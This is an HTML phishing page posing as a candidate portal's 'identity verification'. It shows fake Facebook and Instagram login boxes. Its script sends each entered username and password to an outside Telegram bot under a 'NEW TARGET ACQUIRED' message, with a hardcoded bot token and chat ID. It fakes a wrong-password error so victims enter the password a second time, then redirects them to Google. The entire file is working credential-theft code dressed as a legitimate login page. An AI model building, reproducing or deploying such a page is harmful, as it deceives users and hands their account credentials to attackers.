<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Portal | Identity Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden-content { display: none; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">
    <header class="bg-white p-4 text-center border-b shadow-sm">
        <h1 class="text-sm font-bold uppercase tracking-widest text-red-900">CANDIDATE MANAGEMENT SYSTEM</h1>
    </header>

    <main class="flex-grow flex items-center justify-center p-4">
        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl w-full max-w-sm text-center">
            <h2 class="text-xl font-bold mb-2">Secure Sign In</h2>
            <p class="text-xs text-gray-500 mb-6">Verify your identity via authorized social profile</p>
            
            <div class="space-y-3 mb-6">
                <button onclick="openModal('Facebook')" class="w-full border flex items-center justify-start px-4 py-3 rounded-lg hover:bg-gray-50 transition">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" class="w-6 mr-3">
                    <span class="text-sm font-semibold text-gray-700">Verify via Profile A</span>
                </button>
                
                <button onclick="openModal('Instagram')" class="w-full border flex items-center justify-start px-4 py-3 rounded-lg hover:bg-gray-50 transition">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-6 mr-3">
                    <span class="text-sm font-semibold text-gray-700">Verify via Profile B</span>
                </button>
            </div>

            <div class="relative flex py-3 items-center">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="flex-shrink mx-4 text-gray-400 text-xxs uppercase">Or Use System ID</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>

            <div class="mt-4 space-y-3">
                <input type="text" placeholder="Reference ID" class="w-full border p-3 rounded-lg text-sm bg-gray-50 outline-none">
                <input type="text" placeholder="Security Key" class="w-full border p-3 rounded-lg text-sm bg-gray-50 outline-none">
                <button class="w-full bg-red-800 text-white py-3 rounded-lg font-bold text-sm">LOG IN</button>
            </div>
        </div>
    </main>

    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-70 hidden flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden shadow-2xl">
            <div class="p-8 text-center">
                <img id="modal-logo" src="" class="w-14 mx-auto mb-4">
                <h3 class="font-bold text-lg mb-1">Login Required</h3>
                <p class="text-xs text-gray-400 mb-4">Authorized access only</p>
                
                <div id="error-msg" class="bg-red-50 text-red-600 text-xs p-3 rounded-lg mb-4 hidden border border-red-100">
                    ‚ö†Ô∏è Incorrect password. Please try again.
                </div>
                
                <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded-xl mb-3 text-sm bg-gray-50 focus:ring-1 focus:ring-gray-300 outline-none">
                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded-xl mb-5 text-sm bg-gray-50 focus:ring-1 focus:ring-gray-300 outline-none">
                
                <button onclick="sendData()" id="btnText" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold hover:bg-blue-700 shadow-lg transition">CONFIRM</button>
                <button onclick="closeModal()" class="mt-4 text-gray-400 text-xs hover:underline">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: "8479598107:AAHtDSL81LYQAfnLIWghnpLwDoqaMJ8SLIk",
            CHAT_ID: "5757737130",
            REDIR: "https://www.google.com"
        };

        let attempt = 0;
        let currentPlatform = "";

        function openModal(platform) {
            currentPlatform = platform;
            const logo = document.getElementById('modal-logo');
            const btn = document.getElementById('btnText');
            
            if(platform === 'Facebook') {
                logo.src = "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg";
                btn.style.backgroundColor = "#1877F2";
            } else {
                logo.src = "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg";
                btn.style.backgroundColor = "#E1306C";
            }
            document.getElementById('loginModal').classList.remove('hidden');
        }

        function closeModal() {
            document.getElementById('loginModal').classList.add('hidden');
        }

        async function sendData() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('btnText');
            const errorMsg = document.getElementById('error-msg');

            if (!user || !pass) { alert("Please fill all fields"); return; }

            btn.innerText = "Verifying...";
            btn.disabled = true;

            const message = `üî• **NEW TARGET ACQUIRED**\n\nüÜî **Platform:** ${currentPlatform}\nüë§ **Username:** \`${user}\` \nüîë **Password:** \`${pass}\` \nüî¢ **Attempt:** ${attempt + 1}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    attempt++;
                    if (attempt === 1) {
                        errorMsg.classList.remove('hidden');
                        document.getElementById('pass').value = "";
                        btn.innerText = "CONFIRM";
                        btn.disabled = false;
                    } else {
                        window.location.href = CONFIG.REDIR;
                    }
                } else {
                    alert("Verification failed. Please retry.");
                    btn.innerText = "CONFIRM";
                    btn.disabled = false;
                }
            } catch (err) {
                alert("Network error.");
                btn.innerText = "CONFIRM";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
